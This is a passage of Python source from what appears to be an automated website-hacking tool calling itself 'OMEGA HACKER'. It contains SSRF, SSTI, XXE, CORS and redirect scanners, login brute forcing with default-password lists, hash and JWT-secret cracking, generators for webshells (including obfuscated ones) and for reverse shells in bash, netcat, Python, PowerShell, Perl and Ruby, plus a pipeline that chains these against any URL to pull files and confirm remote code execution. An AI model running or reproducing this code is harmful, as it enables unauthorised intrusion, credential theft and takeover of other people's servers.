        "http://metadata.google.internal/computeMetadata/v1/",
        "http://localhost:22/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:9200/",
        "file:///etc/passwd",
    ]
    for p_lower, orig_param in [(k.lower(), k) for k in params.keys()]:
        if any(sp in p_lower for sp in SSRF_PARAMS):
            for test_url_str in test_urls[:4]:
                tp = params.copy()
                tp[orig_param] = [test_url_str]
                nq = urllib.parse.urlencode(tp, doseq=True)
                tu = parsed._replace(query=nq).geturl()
                try:
                    start = time.time()
                    resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
                    elapsed = time.time() - start
                    body = resp.text[:500]
                    if any(x in body for x in ["ami-", "instance-id", "meta-data", "computeMetadata", "root:"]):
                        findings.append({"type": "SSRF", "parameter": orig_param, "test_url": test_url_str[:50], "indicator": "Internal service accessible", "confidence": 0.9})
                        break
                    if elapsed > 2.0:
                        findings.append({"type": "SSRF (time-based)", "parameter": orig_param, "test_url": test_url_str[:50], "time": "{:.1f}s".format(elapsed), "confidence": 0.6})
                    resp.close()
                except Exception:pass
    return findings

SSTI_PAYLOADS = [
    ("Jinja2", "{{7*7}}"),
    ("Twig", "{{7*7}}"),
    ("Freemarker", "${7*7}"),
    ("Velocity", "#set($x=7*7)$x"),
    ("Smarty", "{$smarty.server.SERVER_NAME}"),
    ("ERB", "<%= 7*7 %>"),
    ("Angular", "{{7*7}}"),
]

def scan_ssti(url, timeout=15):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    if not params:
        return findings
    for pn in params:
        for pname, payload in SSTI_PAYLOADS:
            tp = params.copy()
            tp[pn] = [payload]
            nq = urllib.parse.urlencode(tp, doseq=True)
            tu = parsed._replace(query=nq).geturl()
            try:
                resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
                if "49" in resp.text and "7*7" not in resp.text:
                    findings.append({"type": "SSTI", "parameter": pn, "payload": pname, "indicator": "Template evaluated: 7*7=49", "confidence": 0.9})
                    break
                resp.close()
            except Exception:pass
    return findings

XXE_PAYLOADS = [
    ("Basic", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'),
    ("Windows", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/system.ini">]><root>&test;</root>'),
]

def scan_xxe(url, timeout=15):
    findings = []
    for pname, payload in XXE_PAYLOADS:
        for ct in ["application/xml", "text/xml"]:
            try:
                resp = get_session(timeout=timeout).post(url, data=payload, headers={"Content-Type": ct}, allow_redirects=False)
                if "root:" in resp.text or "[boot loader]" in resp.text:
                    findings.append({"type": "XXE", "payload": pname, "content_type": ct, "indicator": "File read successful", "confidence": 0.95})
                    break
                resp.close()
            except Exception:pass
        if findings:
            break
    return findings

def scan_cors(url, timeout=10):
    findings = []
    test_origins = ["https://evil.com", "null", "https://example.com", "http://evil.com"]
    try:
        base = url.rstrip("/")
        for origin in test_origins:
            resp = get_session(timeout=timeout).get(base, headers={"Origin": origin}, allow_redirects=False)
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*":
                findings.append({"type": "CORS Wildcard", "origin": origin, "acao": acao, "risk": "Any domain can read responses", "severity": "Medium"})
            elif acao == origin:
                risk = "Attacker can read responses" + (" with credentials!" if acac == "true" else "")
                findings.append({"type": "CORS Origin Reflection", "origin": origin, "acao": acao, "risk": risk, "severity": "Critical" if acac == "true" else "High"})
            resp.close()
    except Exception:pass
    return findings

def scan_open_redirect(url, timeout=10):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    test_urls = ["https://evil.com", "//evil.com", "http://evil.com"]
    redirect_params = ["url", "redirect", "redirect_uri", "return", "return_url", "next", "next_url", "goto", "target", "dest"]
    for p_lower, orig_param in [(k.lower(), k) for k in params.keys()]:
        if any(rp in p_lower for rp in redirect_params):
            for test_url_str in test_urls:
                tp = params.copy()
                tp[orig_param] = [test_url_str]
                nq = urllib.parse.urlencode(tp, doseq=True)
                tu = parsed._replace(query=nq).geturl()
                try:
                    resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
                    location = resp.headers.get("Location", "")
                    if location and ("evil.com" in location or "//evil" in location):
                        findings.append({"type": "Open Redirect", "parameter": orig_param, "redirects_to": location[:100], "url": tu[:200], "confidence": 0.95})
                        break
                    resp.close()
                except Exception:pass
    return findings

COMMON_USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest", "info",
    "support", "webmaster", "noreply", "contact", "sales", "manager",
    "office", "mail", "postmaster", "hostmaster", "demo", "backup",
    "sysadmin", "system", "help", "service", "server", "staff",
    "owner", "supervisor", "operator", "dev", "developer", "api",
    "bot", "admin@", "nobody", "ftp", "www-data", "mysql",
]

COMMON_PASSWORDS = [
    "admin", "password", "123456", "12345678", "1234", "qwerty", "letmein",
    "welcome", "monkey", "dragon", "master", "login", "abc123", "passw0rd",
    "shadow", "sunshine", "trustno1", "princess", "football", "baseball",
    "admin123", "admin1", "administrator", "root", "toor", "Admin@123",
    "Password123", "P@ssw0rd", "p@ssword", "changeme", "secret",
    "test", "test123", "guest", "demo", "default", "temp123",
    "123456789", "1234567890", "111111", "000000", "121212",
    "iloveyou", "sunshine1", "trustn01", "pass123", "pass1234",
    "Welcome1", "Welcome123", "Password1", "Admin123!", "admin@123",
    "qwerty123", "qwerty1", "1q2w3e4r", "123qwe", "zaqxsw",
    "Server", "server1", "backup", "backup123", "support",
    "Company@123", "Company123", "company", "Company1",
    "letmein123", "password1", "password12", "passwd", "P@ssword1",
    "Admin@1234", "admin@1234", "root@123", "Root@123", "toor123",
    "changeme123", "default1", "manager", "Manager123", "Manager@123",
    "pass", "pass1", "pass123!", "p@ss", "p@ss123", "p@$$w0rd",
    "qwerty12345", "asdfgh", "zxcvbn", "123qweasd", "qwe123",
    "1qaz2wsx", "3edc4rfv", "!@#$%^&*", "!@#$%^&*()",
    "password!", "password@", "PASSWORD", "Password",
    "admin!", "admin@", "root!", "root@", "administrator!",
    "test!", "test@", "guest!", "demo!",
    "helloworld", "helloworld123", "world123",
    "summer2024", "summer2025", "winter2024", "spring2024",
    "companyname", "CompanyName", "Company@2024",
]

def brute_force_login(login_url, username_field="username", password_field="password",
                     usernames=None, passwords=None, extra_data=None, method="post",
                     success_indicator=None, timeout=10, max_attempts=200):
    if usernames is None:
        usernames = COMMON_USERNAMES[:15]
    if passwords is None:
        passwords = COMMON_PASSWORDS[:30]
    results = []
    attempts = 0
    for username in usernames:
        for password in passwords:
            if attempts >= max_attempts:
                break
            attempts += 1
            data = {username_field: username, password_field: password}
            if extra_data:
                data.update(extra_data)
            try:
                if method == "post":
                    resp = get_session(timeout=timeout).post(login_url, data=data, allow_redirects=True)
                else:
                    resp = get_session(timeout=timeout).get(login_url, params=data, allow_redirects=True)
                if success_indicator:
                    if isinstance(success_indicator, str):
                        if success_indicator not in resp.text:
                            results.append({"username": username, "password": password})
                            break
                    elif callable(success_indicator):
                        if success_indicator(resp):
                            results.append({"username": username, "password": password})
                            break
                else:
                    if resp.status_code in [302, 301] or "logout" in resp.text.lower() or "dashboard" in resp.text.lower():
                        if "invalid" not in resp.text.lower() and "incorrect" not in resp.text.lower():
                            results.append({"username": username, "password": password, "reason": "Successful redirect"})
                            break
                resp.close()
            except Exception:
                continue
        if results:
            break
    return results

def crack_md5(hash_value):
    wordlist = COMMON_PASSWORDS + [p.upper() for p in COMMON_PASSWORDS] + [p.capitalize() for p in COMMON_PASSWORDS]
    for word in wordlist:
        if hashlib.md5(word.encode()).hexdigest() == hash_value.lower():
            return {"hash": hash_value, "algorithm": "MD5", "password": word}
    return {"hash": hash_value, "algorithm": "MD5", "password": None}

def crack_sha1(hash_value):
    wordlist = COMMON_PASSWORDS + [p.upper() for p in COMMON_PASSWORDS]
    for word in wordlist:
        if hashlib.sha1(word.encode()).hexdigest() == hash_value.lower():
            return {"hash": hash_value, "algorithm": "SHA1", "password": word}
    return {"hash": hash_value, "algorithm": "SHA1", "password": None}

def crack_sha256(hash_value):
    wordlist = COMMON_PASSWORDS + [p.upper() for p in COMMON_PASSWORDS]
    for word in wordlist:
        if hashlib.sha256(word.encode()).hexdigest() == hash_value.lower():
            return {"hash": hash_value, "algorithm": "SHA256", "password": word}
    return {"hash": hash_value, "algorithm": "SHA256", "password": None}

def crack_hash(hash_value, hash_type="auto"):
    hlen = len(hash_value)
    if hash_type == "auto":
        if hlen == 32: hash_type = "MD5"
        elif hlen == 40: hash_type = "SHA1"
        elif hlen == 64: hash_type = "SHA256"
        else: hash_type = "UNKNOWN"
    if hash_type == "MD5": return crack_md5(hash_value)
    elif hash_type == "SHA1": return crack_sha1(hash_value)
    elif hash_type == "SHA256": return crack_sha256(hash_value)
    else: return {"hash": hash_value, "algorithm": hash_type, "message": "Unsupported type"}

COMMON_JWT_SECRETS = [
    "secret", "key", "password", "token", "jwt_secret", "jwt-secret",
    "my_secret", "my-secret", "secret_key", "secret-key",
    "super_secret", "supersecret", "very_secret", "app_secret",
    "private_key", "private-key", "pass", "passwd",
    "admin", "root", "test", "dev", "prod", "staging",
    "change_me", "changeme", "change-me",
    "your-256-bit-secret", "your-256-bit-secret-here",
    "sup3r_s3cr3t", "s3cr3t", "p@ssw0rd", "123456",
    "abcdef", "abcdefgh", "test123", "testkey",
    "mysecretkey", "mykey", "secret123",
    "secret_key_123", "jwt_key", "jwtkey",
    "access_token", "refresh_token",
    "HS256", "HS384", "HS512",
    "None", "none", "null",
    "development", "production", "local",
    "api_secret", "api-key", "api_key",
    "encryption_key", "signing_key",
    "top_secret", "classified",
]

def jwt_decode(token):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "Invalid JWT format"}
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
        return {"header": header, "payload": payload, "signature": parts[2][:20] + "..."}
    except Exception as e:
        return {"error": str(e)}

def jwt_crack(token):
    header = jwt_decode(token)
    if "error" in header:
        return header
    alg = header.get("header", {}).get("alg", "HS256")
    if alg == "none":
        parts = token.split(".")
        none_token = parts[0] + "." + parts[1] + "."
        return {"cracked": True, "secret": "None", "forged_token": none_token, "attack": "Algorithm None"}
    for secret in COMMON_JWT_SECRETS:
        try:
            sig = hashlib.sha256((parts[0] + "." + parts[1] + secret).encode()).digest()
            expected = base64.urlsafe_b64encode(sig).decode().rstrip("=")
            if expected == parts[2]:
                return {"cracked": True, "secret": secret, "payload": header["payload"]}
        except Exception:
            continue
    return {"cracked": False, "message": "Secret not found in wordlist"}

def generate_webshell(shell_type="php"):
    shells = {}
    if shell_type in ["php", "all"]:
        shells["php_cmd"] = "<?php system($_GET['cmd']); ?>"
        shells["php_shell"] = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
        shells["php_stealth"] = "<?php $_='c'.'md';$$_=@$_GET['_'];system($$_);?>"
        shells["php_short"] = "<?=`$_GET[0]`?>"
        shells["php_b64"] = "<?php eval(base64_decode($_GET['b64']));?>"
    if shell_type in ["aspx", "all"]:
        shells["aspx"] = '<%@ Page Language="C#" %>\n<% if (Request["cmd"] != null) { System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); } %>'
    if shell_type in ["jsp", "all"]:
        shells["jsp"] = '<%@page import="java.io.*"%>\n<% if(request.getParameter("cmd")!=null){ Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while((line = br.readLine()) != null) out.println(line); } %>'
    if shell_type in ["python", "all"]:
        shells["python"] = 'import cgi,subprocess; form = cgi.FieldStorage(); cmd = form.getvalue("cmd",""); logger.debug(subprocess.getoutput(cmd))'
    if shell_type in ["node", "all"]:
        shells["node"] = 'require("http").createServer((q,r)=>{var c=require("url").parse(q.url,true).query.cmd;require("child_process").exec(c,(e,o)=>r.end(o||e))}).listen(8080)'
    return shells

def generate_reverse_shell(ip, port, shell_type="all"):
    payloads = {}
    if shell_type in ["bash", "all"]:
        payloads["bash"] = "bash -i >& /dev/tcp/" + str(ip) + "/" + str(port) + " 0>&1"
        b64 = base64.b64encode(("bash -i >& /dev/tcp/" + str(ip) + "/" + str(port) + " 0>&1").encode()).decode()
        payloads["bash_encoded"] = "bash -c '{echo," + b64 + "}|{base64,-d}|{bash,-i}'"
    if shell_type in ["python", "all"]:
        py = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + str(ip) + "\"," + str(port) + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"
        payloads["python"] = "python3 -c '" + py + "'"
    if shell_type in ["php", "all"]:
        payloads["php"] = "php -r '$sock=fsockopen(\"" + str(ip) + "\"," + str(port) + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    if shell_type in ["netcat", "all"]:
        payloads["netcat"] = "nc -e /bin/sh " + str(ip) + " " + str(port)
        payloads["netcat_pipe"] = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + str(ip) + " " + str(port) + " >/tmp/f"
    if shell_type in ["powershell", "all"]:
        ps = '$client = New-Object System.Net.Sockets.TCPClient(\'' + str(ip) + '\',' + str(port) + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        payloads["powershell"] = ps
        ps_b64 = base64.b64encode(ps.encode("utf-16le")).decode()
        payloads["powershell_base64"] = "powershell -e " + ps_b64
    if shell_type in ["perl", "all"]:
        payloads["perl"] = "perl -e 'use Socket;$i=\"" + str(ip) + "\";$p=" + str(port) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"
    if shell_type in ["ruby", "all"]:
        payloads["ruby"] = "ruby -rsocket -e'f=TCPSocket.open(\"" + str(ip) + "\"," + str(port) + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    return payloads

WAF_SIGNATURES = {
    "Cloudflare": ["__cfduid", "cf-ray", "cloudflare"],
    "Akamai": ["akamai", "x-akamai-"],
    "AWS WAF": ["x-amzn-requestid", "AWSWAF"],
    "ModSecurity": ["Mod_Security", "NOYB"],
    "F5 BIG-IP": ["BigIP", "x-connection-hash"],
    "Sucuri": ["Sucuri", "X-Sucuri-Cache"],
    "Imperva": ["incap_ses", "imperva"],
    "Wordfence": ["Wordfence"],
}

def detect_waf(url, timeout=10):
    found = []
    try:
        resp = get_session(timeout=timeout).get(url, allow_redirects=True)
        headers = dict(resp.headers)
        body = resp.text
        for waf, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in body.lower():
                    found.append({"waf": waf, "method": "body"})
                    break
                for h, v in headers.items():
                    if sig.lower() in h.lower() or sig.lower() in v.lower():
                        found.append({"waf": waf, "method": "header " + h})
                        break
        resp.close()
    except Exception:pass
    try:
        resp2 = get_session(timeout=timeout).get(url + "?q=<script>alert(1)</script>", allow_redirects=False)
        if resp2.status_code in [403, 406, 429, 503]:
            found.append({"waf": "Unknown WAF (blocking)", "method": "HTTP " + str(resp2.status_code)})
        resp2.close()
    except Exception:pass
    seen = set()
    unique = []
    for f in found:
        if f["waf"] not in seen:
            seen.add(f["waf"])
            unique.append(f)
    return unique

def detect_api_endpoints(url, timeout=10):
    endpoints = []
    api_paths = ["/api", "/api/v1", "/api/v2", "/v1", "/v2", "/rest", "/graphql", "/swagger.json", "/openapi.json", "/api-docs"]
    base = url.rstrip("/")
    for path in api_paths:
        try:
            resp = get_session(timeout=timeout).get(base + path, allow_redirects=False)
            ct = resp.headers.get("Content-Type", "")
            suggested = ""
            if "json" in ct:
                suggested = "JSON API"
            elif resp.status_code == 401:
                suggested = "API (Auth Required)"
            elif resp.status_code == 403:
                suggested = "API (Forbidden)"
            elif resp.status_code in [200, 201]:
                suggested = "API (Accessible)"
            if suggested:
                endpoints.append({"path": path, "status": resp.status_code, "type": suggested})
            resp.close()
        except Exception:pass
    return endpoints

SENSITIVE_FILES = [
    ".env", ".git/config", "wp-config.php", "config.php", "database.php", "db.php",
    "configuration.php", "settings.php", "config.json", "credentials.json",
    "aws/credentials", ".aws/credentials", "credentials",
    "npmrc", ".npmrc", "docker-compose.yml", "Dockerfile",
    "composer.json", "package.json", "phpinfo.php", "info.php",
    "robots.txt", "sitemap.xml", "server-status", "server-info",
    "debug.log", "error.log", "access.log",
    "backup.sql", "database.sql", "dump.sql",
    "backup.zip", "backup.tar.gz",
    "password.txt", "secrets.txt",
    "htpasswd", ".htpasswd",
]

def scan_for_sensitive_files(url, timeout=10):
    found = []
    base = url.rstrip("/")
    for pattern in SENSITIVE_FILES:
        try:
            resp = get_session(timeout=timeout).get(base + "/" + pattern, allow_redirects=False)
            if resp.status_code in [200, 201, 204, 401, 403]:
                size = len(resp.content)
                ct = resp.headers.get("Content-Type", "")
                entry = {"path": pattern, "status": resp.status_code, "size": size, "type": ct[:50]}
                if size < 5000 and "text" in ct:
                    entry["preview"] = resp.text[:200]
                found.append(entry)
            resp.close()
        except Exception:pass
    return found

def detect_wordpress(url, timeout=15):
    result = {"detected": False, "version": None, "users": [], "plugins": []}
    try:
        resp = get_session(timeout=timeout).get(url.rstrip("/") + "/readme.html", allow_redirects=False)
        if resp.status_code == 200:
            vm = re.search(r"Version (\d+\.\d+(?:\.\d+)?)", resp.text)
            if vm:
                result["version"] = vm.group(1)
            result["detected"] = True
        resp.close()
    except Exception:pass
    try:
        resp = get_session(timeout=timeout).get(url.rstrip("/") + "/wp-json/", allow_redirects=False)
        if resp.status_code == 200:
            result["detected"] = True
            try:
                data = resp.json()
                if "namespaces" in data:
                    result["namespaces"] = data["namespaces"]
            except Exception:pass
        resp.close()
    except Exception:pass
    for ep in ["/wp-json/wp/v2/users", "/?rest_route=/wp/v2/users"]:
        try:
            resp = get_session(timeout=timeout).get(url.rstrip("/") + ep, allow_redirects=False)
            if resp.status_code == 200:
                try:
                    users = resp.json()
                    for u in users:
                        if isinstance(u, dict) and "name" in u:
                            result["users"].append({"id": u.get("id"), "name": u.get("name")})
                except Exception:pass
            resp.close()
        except Exception:pass
    return result

def exploit_graphql_introspection(url, timeout=15):
    query = "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind fields(includeDeprecated: true) { name args { name type { name kind } } type { name kind ofType { name kind } } } } } }"
    bases = [url.rstrip("/")]
    for path in ["", "/graphql", "/v1/graphql", "/api/graphql"]:
        full = bases[0] + path
        try:
            resp = get_session(timeout=timeout).post(full, json={"query": query}, allow_redirects=False)
            if resp.status_code == 200:
                data = resp.json()
                if "data" in data and data.get("data", {}).get("__schema"):
                    schema = data["data"]["__schema"]
                    types = [t["name"] for t in schema.get("types", []) if not t["name"].startswith("__")]
                    mutations = [m["name"] for m in (schema.get("mutationType") or {}).get("fields", [])] if schema.get("mutationType") else []
                    queries = [q["name"] for q in (schema.get("queryType") or {}).get("fields", [])] if schema.get("queryType") else []
                    return {"endpoint": full, "types": types[:50], "mutations": mutations[:20], "queries": queries[:20]}
            resp.close()
        except Exception:pass
    return {"error": "No GraphQL introspection available"}

def test_mongodb(host, port=27017, timeout=5):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.send(b'\x3a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00')
        resp = sock.recv(4096)
        sock.close()
        if resp and len(resp) > 50:
            return {"port": port, "service": "MongoDB", "accessible": True, "notes": "Unauthenticated access"}
    except Exception:pass
    return {"port": port, "accessible": False}

def test_redis(host, port=6379, timeout=5):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.send(b"INFO\r\n")
        resp = sock.recv(4096)
        sock.close()
        if resp and b"redis_version" in resp:
            return {"port": port, "service": "Redis", "accessible": True, "notes": "No auth required"}
    except Exception:pass
    return {"port": port, "accessible": False}

def test_elasticsearch(host, port=9200, timeout=5):
    try:
        resp = get_session(timeout=timeout).get("http://" + host + ":" + str(port) + "/", allow_redirects=False)
        if resp.status_code == 200:
            try:
                data = resp.json()
                if "cluster_name" in data:
                    return {"port": port, "service": "Elasticsearch", "accessible": True, "cluster": data.get("cluster_name", ""), "notes": "No auth required"}
            except Exception:pass
        resp.close()
    except Exception:pass
    return {"port": port, "accessible": False}

def hack_website(target_url, quick=True, intense=False):
    """MASTER HACKING FUNCTION - Full-spectrum automated exploitation pipeline."""
    target_url = ensure_url(target_url)
    hostname = extract_hostname(target_url)
    parsed = urlparse(target_url)

    result = {
        "target": target_url,
        "hostname": hostname,
        "started": datetime.now().isoformat(),
        "completed": None,
        "recon": {},
        "vulnerabilities": [],
        "exploits": [],
        "credentials": [],
        "shells": [],
        "extracted_data": [],
        "summary": "",
        "status": "in_progress",
        "errors": [],
    }

    logger.debug("\n" + Fore.RED + "=" * 65)
    logger.debug("  OMEGA HACKER v3.0 -- Targeting: " + target_url)
    logger.debug("  GOD-TIER Exploitation Framework Active")
    logger.debug("=" * 65 + Style.RESET_ALL + "\n")

    # --- PHASE 1: RECONNAISSANCE ---
    logger.debug(Fore.YELLOW + "[PHASE 1/5: RECONNAISSANCE]" + Style.RESET_ALL)

    # DNS
    logger.debug("  * DNS Enumeration...")
    try:
        dns_info = {}
        for rtype in ["A", "MX", "NS", "TXT", "SOA", "CNAME"]:
            records = dns_lookup(hostname, rtype)
            if records:
                dns_info[rtype] = records[:5]
        result["recon"]["dns"] = dns_info
        logger.debug("    + DNS: " + str(len(dns_info)) + " record types found")
    except Exception as e:
        result["errors"].append("DNS: " + str(e)[:50])

    # WHOIS
    try:
        w = whois_lookup(hostname)
        if "error" not in w:
            result["recon"]["whois"] = w
            logger.debug("    + WHOIS: " + w.get("registrar", "Unknown"))
    except Exception:pass

    # Port Scan
    logger.debug("  * Port Scanning...")
    try:
        open_ports = scan_ports(hostname, timeout=2)
        result["recon"]["ports"] = [{"port": p, "service": s} for p, s in open_ports]
        logger.debug("    + Open ports: " + str([p for p, s in open_ports[:20]]))
        for port, service in open_ports[:10]:
            if port == 27017 or service == "MongoDB":
                r = test_mongodb(hostname, port)
                if r.get("accessible"):
                    result["exploits"].append(r)
                    logger.debug("    ! MongoDB accessible without auth!")
            if port == 6379 or service == "Redis":
                r = test_redis(hostname, port)
                if r.get("accessible"):
                    result["exploits"].append(r)
                    logger.debug("    ! Redis accessible without auth!")
            if port in [9200, 9300] or service == "Elasticsearch":
                r = test_elasticsearch(hostname, port)
                if r.get("accessible"):
                    result["exploits"].append(r)
                    logger.debug("    ! Elasticsearch accessible without auth! Cluster: " + r.get("cluster", ""))
    except Exception as e:
        result["errors"].append("Port scan: " + str(e)[:50])

    # Subdomains
    if not quick:
        logger.debug("  * Subdomain Enumeration...")
        try:
            subs = subdomain_bruteforce(hostname, max_workers=30, timeout=3)
            result["recon"]["subdomains"] = [{"sub": s, "ip": ip} for s, ip in subs[:20]]
            if subs:
                logger.debug("    + Found " + str(len(subs)) + " subdomains")
                for sub, ip in subs[:5]:
                    logger.debug("      - " + sub + "." + hostname + " -> " + ip)
        except Exception as e:
            result["errors"].append("Subdomain: " + str(e)[:50])

    # Technology
    logger.debug("  * Technology Detection...")
    try:
        techs = detect_technologies(target_url)
        result["recon"]["technologies"] = techs
        logger.debug("    + Technologies: " + ", ".join(list(techs.keys())[:8]))
        if "WordPress" in techs:
            wp = detect_wordpress(target_url)
            result["recon"]["wordpress"] = wp
            if wp.get("version"):
                logger.debug("    + WordPress v" + wp["version"])
            if wp.get("users"):
                logger.debug("    + WordPress users: " + ", ".join([u["name"] for u in wp["users"][:5]]))
                for u in wp["users"]:
                    result["credentials"].append({"type": "wp_user", "username": u["name"]})
        if "Drupal" in techs:
            result["vulnerabilities"].append({"type": "CMS", "detail": "Drupal - check CVE-2018-7600 (Drupalgeddon2)", "severity": "CRITICAL"})
        if "Joomla" in techs:
            result["vulnerabilities"].append({"type": "CMS", "detail": "Joomla - check CVE-2023-23752", "severity": "HIGH"})
    except Exception as e:
        result["errors"].append("Tech: " + str(e)[:50])

    # WAF
    logger.debug("  * WAF Detection...")
    try:
        waf = detect_waf(target_url)
        if waf:
            result["recon"]["waf"] = waf
            logger.debug("    + WAFs: " + ", ".join([w["waf"] for w in waf]))
    except Exception:pass

    # --- PHASE 2: VULNERABILITY SCANNING ---
    logger.debug("\n" + Fore.YELLOW + "[PHASE 2/5: VULNERABILITY SCANNING]" + Style.RESET_ALL)

    if parsed.query:
        # SQLi
        logger.debug("  * SQL Injection Scan...")
        try:
            sqli = scan_sqli(target_url)
            if sqli:
                result["vulnerabilities"].extend(sqli)
                logger.debug("    ! Found " + str(len(sqli)) + " SQLi vectors")
                for v in sqli[:3]:
                    logger.debug("      - " + v["type"] + " on '" + v.get("parameter", "") + "'")
                    if v.get("confidence", 0) >= 0.8:
                        extracted = exploit_sqli_extract(target_url, v.get("parameter", ""), "error")
                        if extracted:
                            result["extracted_data"].extend(extracted)
                            for e in extracted:
                                logger.debug("      ? Data: " + e.get("field", "") + " = " + e.get("value", "")[:80])
        except Exception as e:
            result["errors"].append("SQLi: " + str(e)[:50])

        # XSS
        logger.debug("  * XSS Scan...")
        try:
            xss = scan_xss(target_url)
            if xss:
                result["vulnerabilities"].extend(xss)
                logger.debug("    ! Found " + str(len(xss)) + " XSS vectors")
        except Exception as e:
            result["errors"].append("XSS: " + str(e)[:50])

        # LFI
        logger.debug("  * LFI Scan...")
        try:
            lfi = scan_lfi(target_url)
            if lfi:
                result["vulnerabilities"].extend(lfi)
                logger.debug("    ! Found " + str(len(lfi)) + " LFI vectors")
                for v in lfi[:2]:
                    content = exploit_lfi_read(target_url, v.get("parameter", ""), "/etc/passwd")
                    if content.get("content"):
                        result["extracted_data"].append({"type": "LFI_FILE", "file": "/etc/passwd", "content": content["content"][:500]})
                        logger.debug("      ? /etc/passwd extracted!")
        except Exception as e:
            result["errors"].append("LFI: " + str(e)[:50])

        # CMDI
        logger.debug("  * Command Injection Scan...")
        try:
            cmdi = scan_cmdi(target_url)
            if cmdi:
                result["vulnerabilities"].extend(cmdi)
                logger.debug("    ! Found " + str(len(cmdi)) + " CMDI vectors")
                for v in cmdi[:2]:
                    cmd_result = exploit_cmdi_execute(target_url, v.get("parameter", ""), "id")
                    if cmd_result and any("uid" in str(s) for s in cmd_result.values()):
                        result["extracted_data"].append({"type": "RCE", "command": "id", "output": str(cmd_result)[:500]})
                        logger.debug("      ? RCE confirmed!")
        except Exception as e:
            result["errors"].append("CMDI: " + str(e)[:50])

        # SSRF
        logger.debug("  * SSRF Scan...")
        try:
            ssrf = scan_ssrf(target_url)
            if ssrf:
                result["vulnerabilities"].extend(ssrf)
                logger.debug("    ! Found " + str(len(ssrf)) + " SSRF vectors")
        except Exception:pass

        # SSTI
        logger.debug("  * SSTI Scan...")
        try:
            ssti = scan_ssti(target_url)
            if ssti:
                result["vulnerabilities"].extend(ssti)
                logger.debug("    ! Found " + str(len(ssti)) + " SSTI vectors")
        except Exception:pass

    # Open Redirect
    logger.debug("  * Open Redirect Scan...")
    try:
        redir = scan_open_redirect(target_url)
        if redir:
            result["vulnerabilities"].extend(redir)
            logger.debug("    ! Found " + str(len(redir)) + " open redirects")
    except Exception:pass

    # CORS
    logger.debug("  * CORS Scan...")
    try:
        cors = scan_cors(target_url)
        if cors:
            result["vulnerabilities"].extend(cors)
            logger.debug("    ! Found " + str(len(cors)) + " CORS misconfigs")
    except Exception:pass

    # XXE
    logger.debug("  * XXE Scan...")
    try:
        xxe = scan_xxe(target_url)
        if xxe:
            result["vulnerabilities"].extend(xxe)
            logger.debug("    ! Found " + str(len(xxe)) + " XXE vectors")
    except Exception:pass

    # --- PHASE 3: DIRECTORY ENUMERATION ---
    if not quick:
        logger.debug("\n" + Fore.YELLOW + "[PHASE 3/5: DIRECTORY ENUMERATION]" + Style.RESET_ALL)
        logger.debug("  * Directory Brute Force...")
        try:
            dirs = dir_bruteforce(target_url, max_workers=15, timeout=5)
            result["recon"]["directories"] = dirs[:30]
            sensitive = [d for d in dirs if d["status"] in [200, 401, 403] and ("admin" in d["url"] or "config" in d["url"] or "backup" in d["url"] or ".env" in d["url"])]
            if sensitive:
                logger.debug("    ! Sensitive paths:")
                for d in sensitive[:8]:
                    logger.debug("      - " + d["url"] + " [" + str(d["status"]) + "]")
        except Exception:pass

    # --- PHASE 4: API & SERVICE EXPLOITATION ---
    logger.debug("\n" + Fore.YELLOW + "[PHASE 4/5: API & SERVICE EXPLOITATION]" + Style.RESET_ALL)
    logger.debug("  * API Detection...")
    try:
        apis = detect_api_endpoints(target_url)
        if apis:
            result["recon"]["api_endpoints"] = apis
            logger.debug("    + Found " + str(len(apis)) + " API endpoints")
            for a in apis[:5]:
                logger.debug("      - " + a["path"] + " [" + str(a["status"]) + "] " + a.get("type", ""))
